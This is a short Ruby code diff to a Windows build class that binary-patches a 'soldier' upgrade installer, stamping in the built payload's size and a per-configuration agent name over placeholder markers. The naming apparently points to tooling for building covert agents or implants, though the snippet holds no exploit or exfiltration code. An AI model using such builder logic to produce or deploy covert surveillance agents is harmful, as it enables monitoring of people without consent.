@@ -283,6 +283,15 @@ class BuildWindows < Build
     raise "Cannot find soldier" unless File.exist? path('output')
     raise "Cannot find soldier installer" unless File.exist? path('soldier_upgrade')
 
+    patch_file(:file => 'soldier_upgrade') do |content|
+      begin
+        content.binary_patch 'SIZE', [File.size(path('output'))].pack('I')
+        content.binary_patch 'SOLDIEROSOLDIEROSOLDIEROSOLDIERO', soldier_name(@factory.confkey).ljust(32, "\x00")
+      rescue Exception => e
+        raise "Soldier upgrade marker not found: #{e.message}"
+      end
+    end
+
     installer = File.read(path('soldier_upgrade'))
     soldier = File.read(path('output'))
 
